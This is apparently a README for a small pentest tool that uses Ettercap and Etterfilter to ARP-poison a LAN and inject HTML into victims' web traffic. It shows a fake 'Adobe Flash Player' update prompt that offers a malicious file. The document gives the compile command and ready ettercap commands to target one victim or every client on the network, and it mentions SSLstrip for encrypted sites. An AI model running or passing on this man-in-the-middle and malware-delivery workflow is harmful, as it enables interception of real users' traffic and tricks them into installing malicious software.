Ze-filter
=========

Sample Etterfilter script to inject additional HTML code on LAN traffic. The Etterfilter utility is used to compile source filter files into binary filter files that can be interpreted by the JIT interpreter in the Ettercap filter engine. You have to compile your filter scripts in order to use them in Ettercap. All syntax/parse errors will be checked at compile time, so you will be sure to produce a correct binary filter for Ettercap. 

Deps:
----------
Ettercap (Installing Ettercap will include Ettercapfilter). Ettercap is sort of the Swiss army knife of ARP poisoning and network sniffing. Ettercap can be extended by using filters and plug-ins, making it able to do all sorts of neat network tasks.

What ftw! iz teh sample script for?
----------------------------
The scripts are supposed to present the ability to use Etterfilter as a Social Engineering tool while doing a Pentest. For instance, you may want to present a malicious file to your victim and trick them to run the file.

While in the same network with the victim(s), you can add some additional HTML code to any web page they visit (If it's an encrypted website you have to combine the use of SSLstrip). In this example scrips, the victims are notified that their "Adobe Flash Player" is outdated and we provide a malicious file as the updated version of Adobe Flash player for download. Evil huh?

How to test the scripts.
--------------------------
There are two approaches to test the above concept.

1. We can aim to replace any `<\title>` tag with our extra HTML code.
```html 
"</title>" will be replaced with something like this "</title><'then our additional HTML goes here'>" 
```

2. Replace any `<\title>` tag with a separate HTML file with the additional HTML code e.g. a malicious form 
```html
"</title>" will be replaced with something like this "</title><iframe src=the-file.html></iframe>"
```

To test for the first approach, use the content in *form folder* and to test for the second approach, use content in *iframe folder*

NB:
You will need to set up a web server and put the content required for HTML injection on the web server. Make sure the files are accessible and then open the file with `.filter` extension; replace the '10.0.0.2' with PI address of your website.

Compiling
-------------
The file with `.filter` extension is the one to be compiled. Open it with your fav editor and make common changes like the IP address, the image source and the executable source... You can host the files in a local web server or have them served by free on-line file servers.

After editing and saving the changes: Use Etterfilter command to compile the file.  

```bash
Etterfilter file.filter -o file.ef
```

`file.flter` is the input file and `file.ef` is the output file. The compiled output file is what we are going to load with Ettercap using switch F (-F).


Running the Script
-----------------

If you don't have Ettercap already installed.
```bash 
sudo apt-get install zlib1g zlib1g-dev
sudo apt-get install build-essential
sudo apt-get install ettercap-text-only
```

To run the sample filter script, just open a terminal and do the following to target a single victim:
```bash
ettercap -T -q -F file.ef -M ARP /10.0.0.6// ///
```
To target all clients in a LAN ( which is very noisy & rude BTW!)
```bash
ettercap -T -q -F file.ef -M ARP /// ///
```

![Screen Shot](./screen-shot.png)
